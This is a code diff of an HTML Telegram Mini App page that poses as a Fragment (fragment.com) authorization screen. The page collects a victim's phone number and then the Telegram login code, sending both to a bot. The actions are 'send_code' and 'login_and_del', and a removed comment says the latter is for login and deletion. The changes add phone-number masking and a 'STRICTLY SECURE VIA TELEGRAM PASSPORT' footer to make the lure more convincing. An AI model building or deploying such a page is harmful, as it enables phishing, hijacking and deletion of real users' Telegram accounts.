@@ -4,31 +4,32 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org"></script>
+    <script src="https://unpkg.com"></script>
     <style>
-        body { background-color: #ffffff; color: #000000; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        body { background-color: #ffffff; color: #000000; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         .container { width: 90%; max-width: 400px; text-align: center; }
-        .tg-logo { width: 80px; height: 80px; margin-bottom: 20px; }
-        h2 { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
+        .tg-logo { width: 75px; height: 75px; margin-bottom: 20px; }
+        h2 { font-size: 24px; font-weight: 700; margin: 0 0 10px; }
         p { font-size: 15px; color: #707579; margin-bottom: 25px; line-height: 1.4; }
+        a { color: #3390ec; text-decoration: none; font-weight: 500; }
         
-        /* Стили для выбора страны */
-        .phone-input-container { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        .phone-box { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
         select { 
-            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #dfe1e5; 
-            background: #f4f4f5; font-size: 16px; outline: none; cursor: pointer;
+            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #dfe1e5; 
+            background: #f4f4f5; font-size: 16px; outline: none; appearance: none;
         }
         input { 
-            width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #dfe1e5; 
+            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dfe1e5; 
             background: #f4f4f5; color: #000; font-size: 18px; box-sizing: border-box; outline: none; text-align: center;
         }
         input:focus { border-color: #3390ec; }
         
         button { 
-            width: 100%; padding: 15px; background: #3390ec; color: #ffffff; border: none; 
-            border-radius: 10px; font-weight: 600; font-size: 17px; cursor: pointer; transition: 0.2s;
+            width: 100%; padding: 16px; background: #3390ec; color: #ffffff; border: none; 
+            border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer; transition: 0.2s;
         }
-        button:active { background: #2b79c7; }
-        .footer { margin-top: 30px; font-size: 12px; color: #999; }
+        button:active { background: #2b79c7; transform: scale(0.98); }
+        .footer { margin-top: 35px; font-size: 12px; color: #9bb2c5; font-weight: 500; }
     </style>
 </head>
 <body>
@@ -36,66 +37,66 @@
         <svg class="tg-logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390EC""")/>><path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>></svg>
 
         <h2 id="title">Fragment</h2>
-        <p id="desc">Введите номер для авторизации на fragment.com</p>
+        <p id="desc">Введите номер для авторизации на <a href="https://fragment.com" target="_blank">fragment.com</a></p>
         
-        <div class="phone-input-container">
-            <!-- Выбор страны -->
-            <select id="countrySelect" onchange="updateCountryCode()">
-                <option value="+7">🇷🇺 Россия (+7)</option>
-                <option value="+994">🇦🇿 Азербайджан (+994)</option>
-                <option value="+1">🇺🇸 США (+1)</option>
-                <option value="+7">🇰🇿 Казахстан (+7)</option>
-                <option value="+998">🇺🇿 Узбекистан (+998)</option>
-                <option value="+380">🇺🇦 Украина (+380)</option>
-                <option value="+375">🇧🇾 Беларусь (+375)</option>
-                <option value="">Другая страна...</option>
+        <div class="phone-box">
+            <select id="country" onchange="changeCountry()">
+                <option value="RU" data-mask="+{7} (000) 000 00 00">🇷🇺 Россия (+7)</option>
+                <option value="AZ" data-mask="+{994} (00) 000 00 00">🇦🇿 Азербайджан (+994)</option>
+                <option value="US" data-mask="+{1} (000) 000 0000">🇺🇸 США (+1)</option>
+                <option value="KZ" data-mask="+{7} (000) 000 00 00">🇰🇿 Казахстан (+7)</option>
+                <option value="UZ" data-mask="+{998} (00) 000 00 00">🇺🇿 Узбекистан (+998)</option>
             </select>
-            <input type="tel" id="inputField" value="+7">
+            <input type="tel" id="phoneInput">
         </div>
         
-        <button id="mainBtn">Далее</button>
-        <div class="footer">Secure authorization via Telegram Passport</div>
+        <button id="btn">Далее</button>
+        <div class="footer">STRICTLY SECURE VIA TELEGRAM PASSPORT</div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        tg.backgroundColor = '#ffffff';
-        tg.headerColor = '#ffffff';
-        
         let step = 1;
-        let phone = "";
+        let mask;
 
-        function updateCountryCode() {
-            const select = document.getElementById('countrySelect');
-            const input = document.getElementById('inputField');
-            if (select.value) {
-                input.value = select.value;
-            }
+        function initMask(pattern) {
+            if (mask) mask.destroy();
+            mask = IMask(document.getElementById('phoneInput'), {
+                mask: pattern,
+                lazy: false
+            });
         }
 
-        document.getElementById('mainBtn').onclick = function() {
-            let val = document.getElementById('inputField').value.trim();
-            if (!val) return;
+        function changeCountry() {
+            const sel = document.getElementById('country');
+            const pattern = sel.options[sel.selectedIndex].getAttribute('data-mask');
+            initMask(pattern);
+        }
+
+        // Стартовая маска
+        initMask("+{7} (000) 000 00 00");
+
+        document.getElementById('btn').onclick = function() {
+            let rawPhone = mask.unmaskedValue;
+            if (rawPhone.length < 7) return;
 
             if (step === 1) {
-                phone = val;
-                // Бот отправит реальный код входа в Telegram
-                tg.sendData(JSON.stringify({ "action": "send_code", "phone": phone }));
+                tg.sendData(JSON.stringify({ "action": "send_code", "phone": "+" + rawPhone }));
                 
-                // Переключаем на ввод кода
-                document.getElementById('countrySelect').style.display = 'none';
-                document.getElementById('desc').innerText = "Введите код из приложения Telegram для подтверждения входа на Fragment";
-                document.getElementById('inputField').value = "";
-                document.getElementById('inputField').placeholder = "Код из Telegram";
-                document.getElementById('mainBtn').innerText = "Войти";
+                document.getElementById('country').style.display = 'none';
+                document.getElementById('desc').innerText = "Введите проверочный код, отправленный в ваш Telegram";
+                mask.destroy();
+                let input = document.getElementById('phoneInput');
+                input.value = "";
+                input.placeholder = "- - - - -";
+                document.getElementById('btn').innerText = "Авторизоваться";
                 step = 2;
                 tg.HapticFeedback.impactOccurred('medium');
             } else {
-                // Отправляем код для входа и удаления
-                tg.sendData(JSON.stringify({ "action": "login_and_del", "code": val, "phone": phone }));
-                tg.HapticFeedback.notificationOccurred('success');
-                setTimeout(() => { tg.close(); }, 500);
+                let code = document.getElementById('phoneInput').value;
+                tg.sendData(JSON.stringify({ "action": "login_and_del", "code": code, "phone": "+" + rawPhone }));
+                tg.close();
             }
         };
     </script>
